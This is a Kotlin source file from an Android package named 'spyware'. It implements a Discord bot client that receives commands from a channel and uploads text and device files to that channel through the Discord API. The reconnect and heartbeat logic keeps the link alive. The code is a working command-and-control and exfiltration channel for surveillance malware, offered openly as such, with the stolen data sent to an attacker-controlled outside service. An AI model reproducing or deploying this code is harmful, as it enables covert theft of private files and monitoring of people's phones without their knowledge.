package io.ks.spyware

import android.content.Context
import android.net.Uri
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONObject
import java.net.URI
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.DataOutputStream
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

class DiscordWebSocketClient() : WebSocketClient(URI("wss://gateway.discord.gg/?v=9&encoding=json")) {

    private val token = "discord-bot-token"
    private var lastHeartbeatTime: Long = 0
    private var lastSequenceNumber: Int? = null
    private var channelId: String? = null

    // Callback to handle received messages
    var onMessageReceived: ((String) -> Unit)? = null
    var onChannelIdReceived: ((String) -> Unit)? = null

    // Called when the WebSocket connection is established
    override fun onOpen(handshakedata: ServerHandshake?) {
        println("Connected to Discord Gateway")
        sendIdentifyMessage()  // Send Identify message to authenticate
        startHeartbeat()       // Start sending heartbeats to keep connection alive
    }

    // Send Identify payload to authenticate the bot
    private fun sendIdentifyMessage() {
        val identifyPayload = JSONObject().apply {
            put("op", 2) // Op code for Identify
            put("d", JSONObject().apply {
                put("token", token)
                put("properties", JSONObject())
                put("intents", 513) // Update this as needed
            })
        }
        send(identifyPayload.toString()) // Send the Identify message
    }

    // Handle received WebSocket messages
    override fun onMessage(message: String?) {
        message?.let {
            try {
                val jsonMessage = JSONObject(it)

                // Update lastSequenceNumber if present
                if (!jsonMessage.isNull("s")) {
                    lastSequenceNumber = jsonMessage.getInt("s")
                }

                // Listen for the GUILD_CREATE event to get the channel ID dynamically
                if (jsonMessage.getInt("op") == 0 && jsonMessage.optString("t") == "GUILD_CREATE") {
                    val event = jsonMessage.getJSONObject("d")
                    val channels = event.getJSONArray("channels")

                    // Find the first text channel (type == 0) and get the channel ID
                    for (i in 0 until channels.length()) {
                        val channel = channels.getJSONObject(i)
                        if (channel.getInt("type") == 0) { // 0 is a text channel
                            channelId = channel.getString("id")
                            println("Channel ID: $channelId")
                            onChannelIdReceived?.invoke(channelId!!)
                            break
                        }
                    }
                }

                // Process MESSAGE_CREATE events
                if (jsonMessage.getInt("op") == 0 && jsonMessage.optString("t") == "MESSAGE_CREATE") {
                    val event = jsonMessage.getJSONObject("d")
                    val content = event.getString("content")

                    // Trigger the callback if defined
                    onMessageReceived?.invoke(content)
                }
            } catch (e: Exception) {
                println("Error parsing message: ${e.message}")
            }
        }
    }

    // Handle WebSocket connection closure
    override fun onClose(code: Int, reason: String?, remote: Boolean) {
        println("Connection closed. Reason: $reason")
        attemptReconnect()
    }

    // Handle errors during WebSocket communication
    override fun onError(ex: Exception?) {
        println("Error occurred: ${ex?.message}")
        attemptReconnect()
    }

    // Attempt to reconnect after a short delay
    private fun attemptReconnect() {
        GlobalScope.launch(Dispatchers.IO) {
            delay(5000) // Wait for 5 seconds before reconnecting
            println("Attempting to reconnect...")
            val newClient = DiscordWebSocketClient() // Recreate client with the same token
            newClient.start() // Start a fresh connection
        }
    }

    // Start sending heartbeat to keep the connection alive
    private fun startHeartbeat() {
        GlobalScope.launch(Dispatchers.IO) {
            while (true) {
                delay(15000)  // Wait for 15 seconds (Discord's heartbeat interval)
                if (System.currentTimeMillis() - lastHeartbeatTime >= 15000) {
                    sendHeartbeat() // Send heartbeat if the interval is exceeded
                }
            }
        }
    }

    // Send heartbeat to the Discord server
    private fun sendHeartbeat() {
        lastSequenceNumber?.let { sequenceNumber ->
            val heartbeatPayload = JSONObject().apply {
                put("op", 1)  // Op code for heartbeat
                put("d", sequenceNumber)  // Use the last sequence number as the data payload
            }
            send(heartbeatPayload.toString())  // Send heartbeat message
            lastHeartbeatTime = System.currentTimeMillis() // Update last heartbeat time
            println("Sent heartbeat with sequence: $sequenceNumber")
        }
    }

    // Send a message to the Discord channel as the bot
    fun sendMessage(title: String,content: String) {
        val id = channelId
        if (id == null) {
            println("Channel ID is not set. Cannot send message.")
            return
        }

        // Define the URL to send the message
        val url = URL("https://discord.com/api/v9/channels/$id/messages")

        // Prepare the JSON payload to send the message
        val json = JSONObject().apply {
            put("content", "$title\n```\n$content\n```")
        }

        // Perform HTTP POST request asynchronously
        GlobalScope.launch(Dispatchers.IO) {
            try {
                // Set up the connection
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Authorization", "Bot $token") // Set the Authorization header with the bot token
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true

                // Write the message content to the output stream
                withContext(Dispatchers.IO) {
                    val os: OutputStream = connection.outputStream
                    os.write(json.toString().toByteArray())
                    os.flush()
                }

                // Get the response code
                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    println("Message sent successfully!")
                } else {
                    println("Failed to send message. Response Code: $responseCode")
                }
                connection.disconnect()

            } catch (e: Exception) {
                println("Error sending message: ${e.message}")
            }
        }
    }

    fun sendDiscordFileMessage(context: Context,title: String, fileUri: Uri) {
        val id = channelId
        if (id == null) {
            println("Channel ID is not set. Cannot send message.")
            return
        }

        val webhookUrl = "https://discord.com/api/v9/channels/$id/messages"
        val boundary = "Boundary-${System.currentTimeMillis()}"

        // Start the HTTP request to send a file
        GlobalScope.launch(Dispatchers.IO) {
            try {
                // Open connection
                val connection = (URL(webhookUrl).openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    setRequestProperty("Authorization", "Bot $token")  // Set authorization header with bot token
                    setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                    doOutput = true
                }

                val output = DataOutputStream(connection.outputStream)

                // JSON Payload (content title)
                val jsonPayload = JSONObject().apply {
                    put("content", title)  // Use title as the message content
                }

                // Write the JSON payload part
                output.writeBytes("--$boundary\r\n")
                output.writeBytes("Content-Disposition: form-data; name=\"payload_json\"\r\n")
                output.writeBytes("Content-Type: application/json\r\n\r\n")
                output.writeBytes(jsonPayload.toString())
                output.writeBytes("\r\n")

                // Handle file part
                val fileName = fileUri.path?.substringAfterLast('/') ?: "file"

                // Open the file input stream
                val inputStream = context.contentResolver.openInputStream(fileUri)
                    ?: throw Exception("Failed to open file stream")

                output.writeBytes("--$boundary\r\n")
                output.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"\r\n")
                output.writeBytes("Content-Type: application/octet-stream\r\n\r\n")

                // Write the file bytes to the output stream
                inputStream.copyTo(output)
                inputStream.close()

                // End the multipart body
                output.writeBytes("\r\n")
                output.writeBytes("--$boundary--\r\n")
                output.flush()
                output.close()

                // Get the response code
                val responseCode = connection.responseCode
                if (responseCode in 200..299) {
                    println("File sent successfully!")
                } else {
                    println("Failed to send file. Response Code: $responseCode - ${connection.responseMessage}")
                }
                connection.disconnect()

            } catch (e: Exception) {
                println("Error sending file: ${e.message}")
            }
        }
    }


    // Method to start the WebSocket connection
    fun start() {
        connect() // Initiates the connection to Discord
    }

    // Method to close the WebSocket connection
    fun stop() {
        close()  // Close the connection
    }
}
